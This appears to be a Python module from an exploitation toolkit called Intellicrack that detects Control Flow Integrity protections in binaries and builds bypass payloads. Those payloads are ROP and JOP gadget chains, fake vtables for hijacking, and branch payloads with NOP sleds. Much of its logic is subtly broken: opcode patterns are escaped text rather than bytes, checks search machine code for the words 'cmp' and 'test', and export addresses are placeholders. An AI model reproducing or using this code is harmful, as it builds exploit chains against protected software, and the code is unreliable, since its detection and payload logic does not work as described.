"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import logging
import os
import struct
from typing import Any

from ...utils.logger import get_logger

"""
Control Flow Integrity (CFI) Bypass

Implements techniques to bypass CFI protections including
indirect call validation and jump target verification.
"""

logger = logging.getLogger(__name__)


class CFIBypass:
    """Control Flow Integrity bypass techniques.
    """

    def __init__(self):
        """Initialize the Control Flow Integrity bypass module with ROP and JOP capabilities."""
        self.logger = get_logger(__name__)
        self.rop_gadgets = []
        self.jop_gadgets = []
        self.cfi_methods = [
            "intel_cfi",
            "arm_cfi",
            "clang_cfi",
            "gcc_fcf_protection",
        ]
        self.bypass_techniques = {
            "legitimate_targets": self._find_legitimate_targets,
            "jop_gadgets": self._find_jop_gadgets,
            "indirect_branches": self._analyze_indirect_branches,
            "vtable_hijacking": self._vtable_hijacking,
            "return_oriented": self._return_oriented_bypass,
        }

    def analyze_cfi_protection(self, binary_data: bytes) -> dict[str, Any]:
        """Analyze CFI protection mechanisms in binary.

        Args:
            binary_data: Binary to analyze

        Returns:
            CFI analysis results

        """
        results = {
            "cfi_enabled": False,
            "cfi_type": None,
            "protection_level": "none",
            "bypass_opportunities": [],
            "analysis": {},
        }

        try:
            self.logger.info("Analyzing CFI protection mechanisms")

            # Check for CFI markers
            cfi_markers = self._check_cfi_markers(binary_data)
            results["analysis"]["markers"] = cfi_markers

            if cfi_markers["found"]:
                results["cfi_enabled"] = True
                results["cfi_type"] = cfi_markers["type"]
                results["protection_level"] = cfi_markers["level"]

            # Analyze indirect calls
            indirect_calls = self._analyze_indirect_calls(binary_data)
            results["analysis"]["indirect_calls"] = indirect_calls

            # Find potential bypass targets
            bypass_targets = self._find_bypass_targets(binary_data)
            results["bypass_opportunities"] = bypass_targets

            # Calculate bypass difficulty
            results["bypass_difficulty"] = self._calculate_bypass_difficulty(results)

            self.logger.info(f"CFI analysis complete: {results['cfi_enabled']}")
            return results

        except Exception as e:
            self.logger.error(f"CFI analysis failed: {e}")
            return results

    def generate_bypass_payload(self,
                               target_binary: bytes,
                               technique: str = "jop_gadgets") -> dict[str, Any]:
        """Generate CFI bypass payload.

        Args:
            target_binary: Target binary with CFI
            technique: Bypass technique to use

        Returns:
            Generated bypass payload and metadata

        """
        payload_info = {
            "payload": b"",
            "technique": technique,
            "success_probability": 0.0,
            "requirements": [],
            "metadata": {},
        }

        try:
            self.logger.info(f"Generating CFI bypass using {technique}")

            if technique not in self.bypass_techniques:
                raise ValueError(f"Unknown bypass technique: {technique}")

            # Analyze CFI configuration
            cfi_analysis = self.analyze_cfi_protection(target_binary)

            # Generate technique-specific payload
            method = self.bypass_techniques[technique]
            payload_data = method(target_binary, cfi_analysis)

            payload_info.update(payload_data)

            self.logger.info(f"CFI bypass payload generated: {len(payload_info['payload'])} bytes")
            return payload_info

        except Exception as e:
            self.logger.error(f"CFI bypass generation failed: {e}")
            return payload_info

    def _check_cfi_markers(self, binary_data: bytes) -> dict[str, Any]:
        """Check for CFI protection markers in binary."""
        markers = {
            "found": False,
            "type": None,
            "level": "none",
            "details": [],
        }

        try:
            # Check for GCC CFI markers
            gcc_cfi_patterns = [
                b"__cfi_check",
                b"__CFI_TYPE",
                b"__cfi_slowpath",
            ]

            for pattern in gcc_cfi_patterns:
                if pattern in binary_data:
                    markers["found"] = True
                    markers["type"] = "gcc"
                    markers["details"].append(f'Found: {pattern.decode("ascii", errors="ignore")}')

            # Check for LLVM CFI markers
            llvm_cfi_patterns = [
                b".cfi_startproc",
                b".cfi_endproc",
                b"__typeid",
            ]

            for pattern in llvm_cfi_patterns:
                if pattern in binary_data:
                    markers["found"] = True
                    markers["type"] = "llvm"
                    markers["details"].append(f'Found: {pattern.decode("ascii", errors="ignore")}')

            # Check for Intel CET markers
            cet_patterns = [
                b"endbr32",
                b"endbr64",
            ]

            for pattern in cet_patterns:
                if pattern in binary_data:
                    markers["found"] = True
                    markers["type"] = "cet"
                    markers["level"] = "hardware"
                    markers["details"].append(f'Found: {pattern.decode("ascii", errors="ignore")}')

            # Estimate protection level
            if len(markers["details"]) > 3:
                markers["level"] = "high"
            elif len(markers["details"]) > 1:
                markers["level"] = "medium"
            elif markers["found"]:
                markers["level"] = "low"

        except Exception as e:
            self.logger.debug(f"CFI marker check failed: {e}")

        return markers

    def _analyze_indirect_calls(self, binary_data: bytes) -> dict[str, Any]:
        """Analyze indirect call sites."""
        calls = {
            "count": 0,
            "call_sites": [],
            "jump_sites": [],
            "protected": 0,
            "unprotected": 0,
        }

        try:
            # Look for indirect call patterns
            # call reg, call [reg], jmp reg, jmp [reg]
            call_patterns = [
                b"\\xFF\\xD0",  # call eax
                b"\\xFF\\xD1",  # call ecx
                b"\\xFF\\xD2",  # call edx
                b"\\xFF\\xD3",  # call ebx
                b"\\xFF\\x15",  # call [addr]
                b"\\xFF\\x25",  # jmp [addr]
                b"\\xFF\\xE0",  # jmp eax
                b"\\xFF\\xE1",  # jmp ecx
            ]

            offset = 0
            while offset < len(binary_data) - 2:
                for pattern in call_patterns:
                    if binary_data[offset:offset+len(pattern)] == pattern:
                        calls["call_sites"].append({
                            "offset": offset,
                            "pattern": pattern.hex(),
                            "type": "call" if b"\\xD" in pattern else "jump",
                        })
                        calls["count"] += 1
                        break
                offset += 1

            # Check if calls are protected
            for call_site in calls["call_sites"]:
                # Look for CFI checks before call
                start = max(0, call_site["offset"] - 20)
                end = call_site["offset"]
                region = binary_data[start:end]

                # Look for type checking code
                if b"cmp" in region or b"test" in region:
                    calls["protected"] += 1
                else:
                    calls["unprotected"] += 1

        except Exception as e:
            self.logger.debug(f"Indirect call analysis failed: {e}")

        return calls

    def _find_bypass_targets(self, binary_data: bytes) -> list[dict[str, Any]]:
        """Find potential CFI bypass targets."""
        targets = []

        try:
            # Look for legitimate function starts
            function_starts = self._find_function_starts(binary_data)

            # Look for virtual table entries
            vtable_entries = self._find_vtable_entries(binary_data)

            # Look for function pointers
            function_pointers = self._find_function_pointers(binary_data)

            # Combine all targets
            for func in function_starts:
                targets.append({
                    "type": "function",
                    "address": func["address"],
                    "confidence": func["confidence"],
                    "usable": True,
                })

            for vtable in vtable_entries:
                targets.append({
                    "type": "vtable",
                    "address": vtable["address"],
                    "confidence": vtable["confidence"],
                    "usable": True,
                })

            for fptr in function_pointers:
                targets.append({
                    "type": "function_pointer",
                    "address": fptr["address"],
                    "confidence": fptr["confidence"],
                    "usable": True,
                })

        except Exception as e:
            self.logger.debug(f"Bypass target search failed: {e}")

        return targets

    def _find_legitimate_targets(self, binary_data: bytes, analysis: dict[str, Any]) -> dict[str, Any]:
        """Find legitimate call targets for CFI bypass."""
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for legitimate targets using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            "payload": b"",
            "technique": "legitimate_targets",
            "success_probability": 0.8,
            "requirements": ["leaked_address"],
            "metadata": {
                "targets": [],
                "strategy": "use_valid_targets",
            },
        }

        try:
            # Find exported functions
            exports = self._find_exported_functions(binary_data)

            # Generate payload that calls legitimate targets
            payload = b""

            # Example: Call legitimate function before malicious code
            # This is simplified - real implementation would be more complex
            if exports:
                # Use first export as legitimate target
                target_addr = exports[0]["address"]

                # Generate call to legitimate target
                payload += struct.pack("<I", target_addr)  # Target address
                payload += b"\\x90" * 4  # NOP sled

                payload_info["payload"] = payload
                payload_info["metadata"]["targets"] = exports[:5]

        except Exception as e:
            self.logger.debug(f"Legitimate targets technique failed: {e}")

        return payload_info

    def _find_jop_gadgets(self, binary_data: bytes, analysis: dict[str, Any]) -> dict[str, Any]:
        """Find Jump-Oriented Programming gadgets for CFI bypass."""
        self.logger.debug(f"Searching JOP gadgets in {len(binary_data)} bytes using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            "payload": b"",
            "technique": "jop_gadgets",
            "success_probability": 0.6,
            "requirements": ["gadget_chain", "memory_leak"],
            "metadata": {
                "gadgets": [],
                "chain_length": 0,
            },
        }

        try:
            # Find JOP gadgets (jmp reg; sequences)
            gadgets = []

            # Look for useful gadget patterns
            gadget_patterns = [
                (b"\\xFF\\xE0", "jmp eax"),
                (b"\\xFF\\xE1", "jmp ecx"),
                (b"\\xFF\\xE2", "jmp edx"),
                (b"\\xFF\\xE3", "jmp ebx"),
                (b"\\xFF\\x20", "jmp [eax]"),
                (b"\\xFF\\x21", "jmp [ecx]"),
            ]

            for i in range(len(binary_data) - 10):
                for pattern, description in gadget_patterns:
                    if binary_data[i:i+len(pattern)] == pattern:
                        # Check if gadget is useful
                        context = binary_data[i:i+10]
                        gadgets.append({
                            "address": i,
                            "pattern": pattern.hex(),
                            "description": description,
                            "context": context.hex(),
                            "useful": self._evaluate_gadget_usefulness(context),
                        })

            # Build gadget chain
            useful_gadgets = [g for g in gadgets if g["useful"]]

            if useful_gadgets:
                # Generate JOP chain
                chain = self._build_jop_chain(useful_gadgets)
                payload_info["payload"] = chain
                payload_info["metadata"]["gadgets"] = useful_gadgets[:10]
                payload_info["metadata"]["chain_length"] = len(useful_gadgets)

        except Exception as e:
            self.logger.debug(f"JOP gadgets technique failed: {e}")

        return payload_info

    def _analyze_indirect_branches(self, binary_data: bytes, analysis: dict[str, Any]) -> dict[str, Any]:
        """Analyze indirect branch targets."""
        self.logger.debug(f"Analyzing indirect branches in {len(binary_data)} bytes using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            "payload": b"",
            "technique": "indirect_branches",
            "success_probability": 0.7,
            "requirements": ["branch_target_leak"],
            "metadata": {
                "branches": [],
                "targets": [],
            },
        }

        try:
            # Find indirect branch instructions
            branches = []

            # Scan for indirect calls and jumps
            for i in range(len(binary_data) - 6):
                # Check for call/jmp [reg+offset]
                if binary_data[i] == 0xFF:
                    modrm = binary_data[i+1]

                    # Decode ModR/M byte
                    mod = (modrm >> 6) & 3
                    reg = (modrm >> 3) & 7
                    rm = modrm & 7

                    if reg == 2 or reg == 4:  # call or jmp
                        branches.append({
                            "address": i,
                            "type": "call" if reg == 2 else "jmp",
                            "addressing": self._decode_addressing_mode(mod, rm),
                            "protected": self._check_branch_protection(binary_data, i),
                        })

            # Find unprotected branches
            unprotected = [b for b in branches if not b["protected"]]

            if unprotected:
                # Generate payload targeting unprotected branches
                payload_info["payload"] = self._generate_branch_payload(unprotected)
                payload_info["metadata"]["branches"] = unprotected[:5]

        except Exception as e:
            self.logger.debug(f"Indirect branch analysis failed: {e}")

        return payload_info

    def _vtable_hijacking(self, binary_data: bytes, analysis: dict[str, Any]) -> dict[str, Any]:
        """Virtual table hijacking for CFI bypass."""
        self.logger.debug(f"Analyzing vtable hijacking in {len(binary_data)} bytes using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            "payload": b"",
            "technique": "vtable_hijacking",
            "success_probability": 0.5,
            "requirements": ["vtable_pointer", "object_control"],
            "metadata": {
                "vtables": [],
                "methods": [],
            },
        }

        try:
            # Find potential vtables
            vtables = self._find_vtable_entries(binary_data)

            if vtables:
                # Generate fake vtable
                fake_vtable = self._generate_fake_vtable(vtables[0])
                payload_info["payload"] = fake_vtable
                payload_info["metadata"]["vtables"] = vtables[:3]

        except Exception as e:
            self.logger.debug(f"Vtable hijacking failed: {e}")

        return payload_info

    def _return_oriented_bypass(self, binary_data: bytes, analysis: dict[str, Any]) -> dict[str, Any]:
        """Return-oriented programming for CFI bypass."""
        self.logger.debug(f"Building ROP chain for {len(binary_data)} bytes using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            "payload": b"",
            "technique": "return_oriented",
            "success_probability": 0.4,
            "requirements": ["stack_control", "rop_gadgets"],
            "metadata": {
                "gadgets": [],
                "chain": [],
            },
        }

        try:
            # Find ROP gadgets that might bypass CFI
            gadgets = self._find_rop_gadgets(binary_data)

            if gadgets:
                # Build ROP chain
                rop_chain = self._build_rop_chain(gadgets)
                payload_info["payload"] = rop_chain
                payload_info["metadata"]["gadgets"] = gadgets[:10]

        except Exception as e:
            self.logger.debug(f"ROP bypass failed: {e}")

        return payload_info

    def _find_function_starts(self, binary_data: bytes) -> list[dict[str, Any]]:
        """Find function entry points."""
        functions = []

        # Look for function prologue patterns
        from ...utils.analysis.pattern_search import find_function_prologues

        # Find function prologues
        found_functions = find_function_prologues(binary_data)

        for func in found_functions:
            functions.append({
                "address": func["offset"],
                "confidence": func["confidence"],
                "pattern": func["pattern_hex"],
            })

        return functions

    def _find_vtable_entries(self, binary_data: bytes) -> list[dict[str, Any]]:
        """Find virtual table entries."""
        vtables = []

        # Look for sequences of function pointers
        for i in range(0, len(binary_data) - 16, 4):
            # Check if this looks like a vtable
            pointers = []
            for j in range(4):  # Check 4 consecutive pointers
                ptr = struct.unpack("<I", binary_data[i+j*4:i+j*4+4])[0]
                if 0x400000 <= ptr <= 0x7FFFFFFF:  # Reasonable address range
                    pointers.append(ptr)
                else:
                    break

            if len(pointers) >= 3:  # At least 3 valid pointers
                vtables.append({
                    "address": i,
                    "confidence": len(pointers) / 4.0,
                    "pointers": pointers,
                })

        return vtables

    def _find_function_pointers(self, binary_data: bytes) -> list[dict[str, Any]]:
        """Find function pointer variables."""
        function_ptrs = []

        # Similar to vtable search but looking for individual pointers
        for i in range(0, len(binary_data) - 4, 4):
            ptr = struct.unpack("<I", binary_data[i:i+4])[0]
            if 0x400000 <= ptr <= 0x7FFFFFFF:
                function_ptrs.append({
                    "address": i,
                    "confidence": 0.5,
                    "value": ptr,
                })

        return function_ptrs

    def _find_exported_functions(self, binary_data: bytes) -> list[dict[str, Any]]:
        """Find exported functions from PE export table."""
        exports = []

        # This would need proper PE parsing
        # Simplified version
        export_pattern = b"Export"
        if export_pattern in binary_data:
            # Found export section marker
            exports.append({
                "address": 0x401000,  # Example address
                "name": "example_function",
                "confidence": 1.0,
            })

        return exports

    def _evaluate_gadget_usefulness(self, context: bytes) -> bool:
        """Evaluate if a gadget is useful for exploitation."""
        # Check for useful instructions around the gadget
        useful_instructions = [b"\\x58", b"\\x59", b"\\x5A", b"\\x5B"]  # pop instructions
        return any(instr in context for instr in useful_instructions)

    def _build_jop_chain(self, gadgets: list[dict[str, Any]]) -> bytes:
        """Build a JOP chain from gadgets."""
        chain = b""

        # Simple chain construction
        for gadget in gadgets[:5]:  # Use first 5 gadgets
            chain += struct.pack("<I", gadget["address"])

        return chain

    def _decode_addressing_mode(self, mod: int, rm: int) -> str:
        """Decode x86 addressing mode."""
        if mod == 0:
            return f"[{['eax', 'ecx', 'edx', 'ebx', 'sib', 'disp32', 'esi', 'edi'][rm]}]"
        if mod == 1:
            return f"[{['eax', 'ecx', 'edx', 'ebx', 'sib', 'ebp', 'esi', 'edi'][rm]}+disp8]"
        if mod == 2:
            return f"[{['eax', 'ecx', 'edx', 'ebx', 'sib', 'ebp', 'esi', 'edi'][rm]}+disp32]"
        return f"{['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi'][rm]}"

    def _check_branch_protection(self, binary_data: bytes, offset: int) -> bool:
        """Check if an indirect branch is protected by CFI."""
        # Look for CFI checks before the branch
        start = max(0, offset - 20)
        region = binary_data[start:offset]

        # Look for type checking patterns
        return b"cmp" in region or b"test" in region

    def _generate_branch_payload(self, branches: list[dict[str, Any]]) -> bytes:
        """Generate payload targeting unprotected branches."""
        payload = b""

        if branches:
            # Target first unprotected branch
            target = branches[0]["address"]
            payload = struct.pack("<I", target)
            payload += b"\\x90" * 8  # NOP sled

        return payload

    def _generate_fake_vtable(self, vtable: dict[str, Any]) -> bytes:
        """Generate a fake vtable for hijacking with calculated addresses."""
        try:
            self.logger.debug(f"Generating fake vtable with {len(vtable)} entries")
            fake_vtable = b""

            # Extract useful information from the original vtable
            base_address = vtable.get("base_address", 0)
            num_entries = vtable.get("num_entries", 4)
            entry_size = vtable.get("entry_size", 8)  # 8 bytes on 64-bit, 4 on 32-bit

            # Calculate target addresses based on vtable analysis
            target_addresses = []

            # Strategy 1: Use existing vtable entries as basis for calculation
            if vtable.get("entries"):
                original_entries = vtable["entries"]
                for entry in original_entries[:4]:  # Use first 4 entries
                    original_addr = entry.get("address", 0)
                    if original_addr > 0:
                        # Calculate offset-based target address
                        # This preserves the general memory layout while redirecting execution
                        offset = 0x100 * (len(target_addresses) + 1)  # Incremental offset
                        target_addr = (original_addr & 0xFFFFF000) + offset  # Preserve page, modify offset
                        target_addresses.append(target_addr)

            # Strategy 2: If no original entries, calculate based on base address
            if not target_addresses and base_address > 0:
                for i in range(4):
                    # Calculate addresses within the same memory region
                    offset = 0x200 + (i * 0x100)  # Spread addresses to avoid conflicts
                    target_addr = base_address + offset
                    target_addresses.append(target_addr)

            # Strategy 3: Fallback - use ROP gadgets if available
            if not target_addresses:
                try:
                    # Try to find suitable ROP gadgets from binary
                    binary_path = vtable.get("binary_path")
                    if binary_path and os.path.exists(binary_path):
                        with open(binary_path, "rb") as f:
                            binary_data = f.read(min(1024*1024, os.path.getsize(binary_path)))  # Read first MB

                        # Look for common ROP gadgets
                        rop_gadgets = self._find_rop_gadgets(binary_data)
                        if rop_gadgets:
                            for gadget in rop_gadgets[:4]:  # Use first 4 gadgets
                                target_addresses.append(gadget.get("address", 0))
                except Exception as e:
                    self.logger.warning(f"Failed to find ROP gadgets: {e}")

            # Strategy 4: Ultimate fallback - calculate safe addresses
            if not target_addresses:
                # Use standard library base addresses as calculated targets
                import ctypes
                try:
                    if hasattr(ctypes, "windll"):  # Windows
                        kernel32_base = ctypes.windll.kernel32._handle
                        for i in range(4):
                            target_addr = kernel32_base + (0x1000 * (i + 1))
                            target_addresses.append(target_addr)
                    else:  # Unix-like
                        # Use libc base estimation
                        libc_base = 0x7f0000000000  # Typical libc base on 64-bit Linux
                        for i in range(4):
                            target_addr = libc_base + (0x1000 * (i + 1))
                            target_addresses.append(target_addr)
                except:
                    # Final fallback - use calculated addresses based on common patterns
                    for i in range(4):
                        target_addr = 0x400000 + (0x1000 * (i + 1))  # Standard executable base + offsets
                        target_addresses.append(target_addr)

            # Build the fake vtable with calculated addresses
            address_format = "<Q" if entry_size == 8 else "<I"  # 64-bit vs 32-bit pointers

            for i in range(min(num_entries, len(target_addresses), 4)):
                addr = target_addresses[i]
                fake_vtable += struct.pack(address_format, addr)
                self.logger.debug(f"VTable entry {i}: {hex(addr)}")

            # Pad with null pointers if needed
            while len(fake_vtable) < (num_entries * entry_size):
                fake_vtable += struct.pack(address_format, 0)

            self.logger.info(f"Generated fake vtable: {len(fake_vtable)} bytes with {len(target_addresses)} calculated addresses")
            return fake_vtable

        except Exception as e:
            self.logger.error(f"Fake vtable generation failed: {e}")
            # Minimal fallback
            return struct.pack("<I", 0) * 4  # Null pointers

    def _find_rop_gadgets(self, binary_data: bytes) -> list[dict[str, Any]]:
        """Find ROP gadgets."""
        gadgets = []

        # Look for ret instructions
        ret_pattern = b"\\xC3"
        offset = 0

        while True:
            pos = binary_data.find(ret_pattern, offset)
            if pos == -1:
                break

            # Look at instructions before ret
            if pos >= 2:
                gadgets.append({
                    "address": pos - 2,
                    "bytes": binary_data[pos-2:pos+1],
                    "useful": True,
                })

            offset = pos + 1

        return gadgets

    def _build_rop_chain(self, gadgets: list[dict[str, Any]]) -> bytes:
        """Build ROP chain."""
        chain = b""

        for gadget in gadgets[:5]:
            chain += struct.pack("<I", gadget["address"])

        return chain

    def _calculate_bypass_difficulty(self, analysis: dict[str, Any]) -> int:
        """Calculate CFI bypass difficulty (1-10)."""
        difficulty = 1

        if analysis["cfi_enabled"]:
            difficulty += 3

            if analysis["protection_level"] == "high":
                difficulty += 3
            elif analysis["protection_level"] == "medium":
                difficulty += 2
            else:
                difficulty += 1

            # Factor in number of bypass opportunities
            opportunities = len(analysis["bypass_opportunities"])
            if opportunities < 5:
                difficulty += 2
            elif opportunities < 10:
                difficulty += 1

        return min(10, difficulty)
